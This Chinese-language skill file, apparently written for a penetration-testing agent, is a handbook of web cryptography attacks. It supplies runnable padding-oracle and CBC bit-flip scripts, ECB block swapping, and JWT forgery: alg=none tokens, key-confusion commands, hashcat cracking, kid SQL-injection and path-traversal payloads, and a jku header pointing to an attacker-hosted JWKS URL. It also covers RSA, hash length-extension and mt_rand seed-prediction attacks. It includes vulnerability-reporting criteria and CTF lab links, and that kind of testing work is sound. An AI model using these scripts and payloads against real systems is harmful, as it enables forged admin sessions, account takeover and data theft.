---
name: kb-crypto-attack
description: Web 应用密码学攻击完整工具箱——加密参数/加密 Cookie/JWT/RSA/哈希签名/随机数预测的识别、攻击链、可执行脚本与判定门槛
tags: [密码学, JWT, Padding Oracle, RSA, 加密绕过]
date: 2026-08-14
---

# Web 应用密码学攻击手册 2026

> 适用读者：已有 JWT 弱密钥爆破、AES-ECB 硬编码密钥实战基础，需要把"加密参数/加密 Cookie/JWT/令牌"打成体系。
> 优先级：加密参数是本手册最高价值链路——拿到加密 Cookie 先做**模式识别**，再按判定表选攻击。

## 1. 识别：一段密文/令牌怎么判断用了什么加密

拿到加密参数先回答 5 个问题，再决定打法。

| 特征 | 判断 | 下一步 |
|---|---|---|
| 三段 `xxxx.yyyy.zzzz` 结构 | JWT | 第 3 节全谱打 |
| 两端 `=` 的 base64，长度 16 的倍数 | AES-CBC/ECB，PKCS7 填充 | 区分 CBC/ECB + 有无 IV |
| base64 解码后前 16 字节随机且后面有拼接 | CBC 且 IV 前置 | 找 IV 是否可控 |
| 长度 32/64 的 hex（16/32 字节） | MD5/SHA 摘要 | 试哈希签名/长度扩展 |
| 超长 base64 分块、每块 256 字节（RSA 1024） | RSA | 第 4 节 |
| 参数名含 `enc`/`cipher`/`token`/`data`/`sign`/`nonce` | 加密参数 | 全部进加密测试面 |

**区分 ECB / CBC**：提交明文让服务端加密两次，各含 32 字节相同内容（`AAAA...`）。ECB 时两个相同 16 字节块密文**成对重复**；CBC 则不同（前块链接）。
```python
import base64
ct = base64.b64decode(enc)
print(ct[:16] == ct[16:32])   # True=ECB, False=CBC(或 IV 参与)
```
**找加密 Oracle 信号**：参数值变化 → 响应回显对应明文 / 解密失败报错（`padding`/`decrypt`/`IV`/`BadPadding`）→ 同时存在"加密端点"和"解密端点"时**优先测解密端**。


## 2. 分组密码攻击（AES-CBC / ECB）

### 2.1 Padding Oracle（解密 + 任意明文伪造）

原理：CBC 解密 `P[i] = D(C[i]) ⊕ C[i-1]`，服务端校验 PKCS7 填充并泄露"填充是否正确"（报错/状态码/耗时差异）→ 逐字节爆破中间值恢复明文；反向可伪造任意密文。
识别：密文可控 + 解密失败响应有稳定差异。填充错误可能是 500 或 200+错误文案，也可能是时间差。
```python
import requests, base64
URL = "http://target/check"
def oracle(ct_b64):           # 返回填充是否合法，按实际响应特征改
    r = requests.post(URL, data={"data": ct_b64}, timeout=5)
    return r.status_code == 200 and "bad_padding" not in r.text

def crack_block(C_prev, C_tgt):
    P = bytearray(16)
    for pos in range(15, -1, -1):
        for g in range(256):
            C = bytearray(C_prev)
            for j in range(pos+1, 16):
                C[j] = C_prev[j] ^ P[j] ^ (16 - pos)
            C[pos] = g
            if oracle(base64.b64encode(bytes(C) + C_tgt).decode()):
                P[pos] = g ^ C_prev[pos] ^ (16 - pos)
                break
    return bytes(P)

def decrypt_all(ct, bs=16):   # 第一块前一块用 IV
    return b"".join(crack_block(ct[max(0,i-bs):i], ct[i:i+bs]) for i in range(0,len(ct),bs))
```
- 工具：`mpgn/Padding-oracle-attack`（支持 8/16 字节、自动 HTTP）、`Delphi` 库（写好 oracle 后调 `decrypt()/encrypt()`）。
- **伪装任意明文**（无需密钥即可把 `role=user` 改 `role=admin`）：`C'[i-1] = C[i-1] ⊕ 原明文 ⊕ 目标明文`，见 2.2。

### 2.2 CBC Bit-flip（改明文对应位，无需密钥）

`P[i]` 由 `C[i-1]` 直接 XOR 控制 → **翻转 C[i-1] 某位 = 翻转 P[i] 同位**。代价：C[i-1] 块被改乱（放无关数据块）。
```python
ct = bytearray(base64.b64decode(cookie))
pos = 16 + 5                     # 目标块(第2块)内 'u' 的偏移
ct[pos - 16] ^= ord('u') ^ ord('a')   # 改前一块同位，'user'→'admin'
print(base64.b64encode(bytes(ct)).decode())
```
- **IV 可控时改第一块**：`IV' = IV ⊕ 原明文 ⊕ 目标明文`，不破坏任何数据块。
- 实战典型：CryptoHack "flipping cookie"、picoCTF "More Cookies"。
### 2.3 ECB 块操作（复制/移动/删除块）

ECB 每块独立加密 → 块可自由复制粘贴重排，明文块边界对齐时等于"块级明文编辑器"。
```python
ct = bytearray(base64.b64decode(cookie))
ct[16:32] = ct[32:48]           # 把含 admin=1 的块复制覆盖普通用户块
print(base64.b64encode(bytes(ct)).decode())
```
- 明文与块边界不对齐时，先在用户名处塞填充控制对齐（ECB cut-and-paste）。
- 识别：相同明文成对块特征即 ECB。
### 2.4 加密 Oracle（密文枚举/可预测性）

服务端给任意明文返回密文 → 可测：
- **确定性 ECB**：明文表→密文表，直接查表还原其他用户密文含义。
- **IV 复用 + 明文可控**：枚举密文碰撞。
- 有加密端点优先做块边界分析（定位 `user`/`admin`/`role` 在哪个块、第几字节），为 2.2/2.3 定偏移。
## 3. JWT 攻击全谱（最高频）

先用 `python3 jwt_tool.py <JWT> -M pb` 跑 Playbook 全自动（覆盖 broken sig/弱密钥/alg:none/key confusion/kid 注入/JWKS 注入），`-M er` error-based，`-M at` 全跑。

### 3.1 alg=none 与空签名（CVE-2015-2951 系列）

识别：服务端不校验签名 / 只 `decode` 不 `verify`（2025 仍在爆发：CVE-2025-59934 Formbricks `jwt.decode()` 未验签被 ATO、CVE-2025-9485）。
```bash
python3 jwt_tool.py <JWT> -X a        # 自动 alg=none
# 手工：header alg=none，删签名段
python3 - <<'PY'
import base64, json
h=base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"},separators=(',',':')).encode()).rstrip(b'=').decode()
p=base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin"}).encode()).rstrip(b'=').decode()
print(f"{h}.{p}.")
PY
```
注意有的库要求 `alg=None`（大小写）或空签名用 `null`，逐个试。
### 3.2 算法混淆 RS256→HS256（CVE-2016-10555 / CVE-2025-4692）

服务端用 RSA 公钥验 RS256 但不强制 alg → 把 `alg` 改 HS256，用**公钥内容当 HMAC 密钥**签名。
```bash
# 有公钥
openssl x509 -in cert.pem -pubkey -noout > pubkey.pem
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
# 无公钥 → sig2n 从 2 个有效 JWT 数学推导 RSA 公钥
docker run --rm -it portswigger/sig2n <token1> <token2>   # 输出候选公钥+试签 token
# 逐个候选打目标：200=命中对的公钥，302/登录页=错
```
### 3.3 弱密钥爆破

```bash
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 jwt.txt wordlist.txt          # mode 16500 = JWT HS256/384/512
hashcat -a 0 -m 16500 jwt.txt wordlist.txt -r best64.rule
hashcat -a 3 -m 16500 --increment jwt.txt '?a?a?a?a?a?a?a?a'   # 纯爆破短密钥
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```
破解后用 `python3 jwt_tool.py <JWT> -S hs256 -p '<secret>'` 重签任意 claims。先查 `jwt.secrets.list` 常见密钥表（`secret`/`jwt_secret`/`JWT_SECRET`/`123456`）。
### 3.4 kid 注入（SQLi / 路径穿越 / 空密钥）

`kid` 拼进数据库查询或文件路径 → 控制验签密钥来源（2025 高危，CVE-2025-65945 node-jws 空密钥、CVE-2025-10294）。
```json
{"alg":"HS256","kid":"1' UNION SELECT 'attackersecret' --"}   // 库返回 attackersecret 作密钥
{"alg":"HS256","kid":"../../dev/null"}                        // 读到空文件 → 空串密钥
{"alg":"HS256","kid":"/proc/sys/kernel/randomize_va_space"}   // 已知内容文件当密钥
```
Python 手工用任意密钥签名（含空串）：
```python
import hmac, hashlib, base64, json
def sign(h,p,secret):
    hh=base64.urlsafe_b64encode(json.dumps(h,separators=(',',':')).encode()).rstrip(b'=')
    pp=base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).rstrip(b'=')
    s=hmac.new(secret.encode(), hh+b'.'+pp, hashlib.sha256).digest()
    return (hh+b'.'+pp+b'.'+base64.urlsafe_b64encode(s).rstrip(b'=')).decode()
```
### 3.5 jku / x5u / jwk 可控密钥

- `jku`：header 指向的 JWKS URL 可伪造 → 托管自己生成的 RSA 密钥对。`python3 jwt_tool.py <JWT> -X s -ju http://attacker/jwks.json`。
- `x5u`：指向可控证书 URL，返回自己签发的证书。
- 服务端若拉取攻击者 JWKS（CVE-2025-30144 fast-jwt/Spring Security JKU 注入 SSRF），直接控制验签公钥。
### 3.6 claims 篡改

只改 payload 不重签 → 401/签名错误 → 说明签名校验存在，切 3.2/3.3。用 `-I` 注入 `exp`/`iat`/`role`/`admin`/`email_verified`；同时测 `exp:0`（永不过期）与 `nbf` 未来时间。
## 4. RSA 攻击

识别：参数带 `n/e`、`modulus/exponent`、PEM 公钥、超长 base64（256 字节=RSA1024）。统一先跑 RsaCtfTool 全量自动，再针对性打。
### 4.1 低加密指数（e=3，无填充）

`c = m^3 mod n`，若 `m^3 < n` 直接开立方：
```bash
python3 RsaCtfTool.py --publickey key.pub --uncipherfile c.txt   # 自动含小 e 攻击
python3 - <<'PY'
import gmpy2
c=int(open('c').read()); m=gmpy2.iroot(c,3)[0]
print(m.to_bytes((m.bit_length()+7)//8,'big'))
PY
```
扩展：e=3 + 3 个不同 n 同明文 → Håstad 广播，`RsaCtfTool --attack hastads`。

### 4.2 共模攻击（common modulus）

同 n 不同 e1/e2 加密同明文，扩展欧几里得恢复明文：
```bash
python3 RsaCtfTool.py --publickey key1.pub --publickey2 key2.pub \
  --uncipherfile1 c1 --uncipherfile2 c2 --attack common_modulus
```
### 4.3 Wiener 低解密指数（d 小）

`d < n^(1/4)/3` 时由连分数恢复 d（Boneh-Durfee 放宽到 `n^0.292`）：
```bash
python3 RsaCtfTool.py -n <N> -e <E> --attack wiener
python3 RsaCtfTool.py --publickey key.pub --attack all
```

### 4.4 参数替换 / n,e 混淆（签名绕过重点）

服务端用 RSA 验签且攻击者可替换公钥参数时：
- **n 换成自己的、e 保持** → 用自己的 d 签名，服务端用"被替换的 n"验签通过。
- **e 换成 1** → `m^1 mod n = m`，签名 = 明文本身。
- **n 换成攻击者可控小值（如 3）** → 签名 = 开立方根。
识别：JWT 头含 `jwk`/`x5c` 内联公钥（服务端信任内联公钥）→ 直接替换整块公钥。
### 4.5 签名伪造（d 不可用时）

- 拿到 `(n,e)` 公钥无 d → 用 4.4 的 e=1 / n 替换（若服务端接受）。
- PKCS#1 v1.5 验签不严（不验 DigestInfo 的算法 OID）→ 构造 `00 01 FF..FF 00 || ASN.1 || data` 伪造（CVE-2006-4339 类）。
## 5. 哈希与随机数

### 5.1 哈希长度扩展（SHA-1/MD5/SHA-256 的 `HASH(secret||msg)` 签名）

Merkle-Damgård 结构的 `HASH(secret||msg)` 可在不改已知签名的前提下附加数据并伪造新签名。识别：API 签名 = 一段 hash 且是 `secret+参数` 拼接（不是 HMAC）。HMAC 免疫。
```bash
git clone https://github.com/iagox86/hash_extender
./hash_extender --data 'admin' --secret 15 --append '&admin=1' \
  --signature <已知签名> --format sha1
# 输出 new_data + new_signature，换掉原 data 和签名提交
# 备选: HashPump / hexpand
```
secret 长度未知时枚举 1-32 逐个跑，命中即得。

### 5.2 时间戳 / 随机数可预测（token 伪造）

识别：令牌像 `md5(mt_rand(...))` / `uniqid()` / 种子是 `time()`/`microtime()`。CVE-2024-27632（Savane CMS，`mt_srand(microtime)` + `md5(mt_rand)` 生成 CSRF token）。
```bash
git clone https://github.com/openwall/php_mt_seed && cd php_mt_seed
./php_mt_seed <out1> <out2> [out3...]      # 还原种子 → 预知后续所有 token
# 时间种直接枚举: 以响应 Date 头为中心 ±120 秒逐秒 mt_srand 重放
```
- `uniqid()`/`uniqid(mt_rand())` 可预测：`uniqid = hex(时间戳微秒)`，时间窗口枚举。
- `random()`/`Math.random()`/`mt_rand()` 一律视为可预测，用于口令重置/会话/CSRF token 即高价值。

### 5.3 UUID 可预测

- **UUID v1**：`时间戳(60bit)+时钟序列+MAC` → 知道生成时间即可推算，同 MAC 下枚举时间窗口。
- **UUID v4 但弱随机源**：底层用 `rand()`/`random()` → 状态可恢复。
```python
import uuid, datetime
u = uuid.UUID('xxxxxxxx-xxxx-1xxx-xxxx-xxxxxxxxxxxx')
ts = (u.time - 0x01b21dd213814000) / 1e7   # 反推生成时刻
print(datetime.datetime(1970,1,1)+datetime.timedelta(seconds=ts))
```

## 6. 非对称误用（RSA 加密端）

### 6.1 PKCS#1 v1.5 填充 Oracle（Bleichenbacher）

服务端 RSA 解密后返回"填充错误"与"其他错误"的差异 → 逐位恢复明文，2023 年 ROBOT 攻击重演（CVE-2017-6168 系）。识别：RSA 加密参数 + 解密失败报错差异。用 RsaCtfTool `--attack bleichenbacher` 或专用脚本，需服务端可反复触发。

### 6.2 密钥参数混淆

- 把 RSA **公钥当 HMAC 密钥**（即 3.2 的 RSA 侧对应）。
- `(n,e)` 与 `(n,d)` 互换、PEM 头部被剥离导致解析为不同类型密钥。

## 7. 实战工具清单

| 工具 | 用途 | 命令 |
|---|---|---|
| jwt_tool v2.3.0 | JWT 全谱 | `-X a/b/k/s/p` `-M pb/er/at` `-C -d` `-V -pk` `-ju` `-I` |
| hashcat | JWT/哈希爆破 | `-a 0 -m 16500 jwt.txt dict.txt`（JWT HS256） |
| john | JWT 爆破备选 | `--format=HMAC-SHA256` |
| RsaCtfTool | RSA 多攻击 | `--attack wiener/common_modulus/hastads/all` |
| mpgn/Padding-oracle-attack | CBC padding oracle | `padding-oracle.py -c <ct> -l 16 --host X --get ...` |
| hash_extender | 哈希长度扩展 | `--data --secret --append --signature --format` |
| php_mt_seed | mt_rand 种子爆破 | 输入连续输出还原种子 |
| sig2n / rsa_sign2n | RS256→HS256 推导公钥 | `docker run --rm -it portswigger/sig2n <t1> <t2>` |
| CyberChef | 快速 base64/JWT/哈希 | JWT Sign→HS256 用公钥当密钥 |
| Burp Suite | 主链路 | 装 **JWT Editor**（重签）+ **Crypto** 扩展（padding oracle/密文 fuzz） |

**通用推进顺序**：识别（§1）→ 解密端优先（padding oracle）→ 块操作（CBC bit-flip/ECB）→ JWT 全谱 → RSA → 哈希/随机数。

## 8. 判定门槛（什么算真漏洞）

**构成漏洞**（三条件同满足）：
1. 可复现：同一密文/令牌稳定触发，非缓存/偶然。
2. 可利用链：能实际改变业务状态——越权读他人数据、改 `role/admin` 标志、伪造他人 token、绕过口令重置/CSRF。
3. 有影响：命中真实数据/权限/业务动作，给出完整请求、响应、可复现 payload。

**默认不构成漏洞**：
- 仅"使用了弱算法/弱密钥"而无利用（JWT 用 HS256 但密钥强、密文无业务可控点）。
- 密钥或 IV 固定但**无输入可控点**、无法证明可伪造/解密他人数据。
- `alg=none` 但服务端拒绝该头部（需实际验签通过 + 拿到越权数据）。
- 加密接口存在但响应不泄露可作 oracle 的稳定差异。

**汇报**：每条漏洞给出完整密文/令牌、请求包、响应差异、复现脚本。`alg=none`/弱密钥需落到"改了什么 claims → 访问到哪条越权数据"才算数。

## 9. 靶场与资源

- **CryptoHack**（分组密码/JWT/RSA 全题型）：https://cryptohack.org
- **PortSwigger JWT 学院靶场**：https://portswigger.net/web-security/jwt （weak key / alg confusion / kid / jku / sig2n 全套）
- **JWT Lab**：https://github.com/ticarpi/jwt-hacking-playground （本地起靶场，配 jwt_tool）
- **Padding Oracle 靶场**：https://github.com/mpgn/Padding-oracle-attack （自带 test.py 本地验证）
- **picoCTF More Cookies / CryptoHack flipping cookie**（CBC bit-flip 实战）
- 手册：HackTricks Crypto 目录 https://hacktricks.wiki/en/crypto/ ；OWASP JWT Cheat Sheet

## Sources（2024-2026 查证）

- jwt_tool v2.3.0：https://github.com/ticarpi/jwt_tool
- JWT 弱密钥爆破 + hashcat mode 16500：https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key ；https://hashcat.net/forum/archive/index.php?thread-10787.html
- padding oracle 2024 工具：https://github.com/BrunoRochaDev/Delphi ；https://github.com/mpgn/Padding-oracle-attack ；UMDCTF2024 writeup https://pwn-la-chapelle.eu/posts/umdctf2024_paddingoracle/
- CBC bit-flip：https://mintlify.wiki/HackTricks-wiki/hacktricks/crypto/cipher-block-chaining ；picoCTF More Cookies https://ctftime.org/writeup/27021
- JWT kid 注入（SQLi/穿越/命令/LDAP，2025）：https://github.com/cerberauth/jwtop/blob/main/docs/vulnerabilities/jwt-kid-injection.mdx
- 2025 新 CVE：CVE-2025-59934（Formbricks `decode` 未验签）https://www.mallory.ai/vulnerabilities/CVE-2025-59934 ；CVE-2025-65945（node-jws 空密钥）https://github.com/jedisct1/CVE-2025-65945-poc ；CVE-2025-10294 ；CVE-2025-30144（fast-jwt iss 数组/JKU）
- sig2n：https://github.com/silentsignal/rsa_sign2n ；PortSwigger 无公钥混淆靶场 https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key
- RsaCtfTool：https://github.com/RsaCtfTool/RsaCtfTool
- hash_extender：https://github.com/iagox86/hash_extender
- 随机数预测：php_mt_seed（openwall）；CVE-2024-27632 Savane CMS 时间种子 https://github.com/ally-petitt/CVE-2024-27632
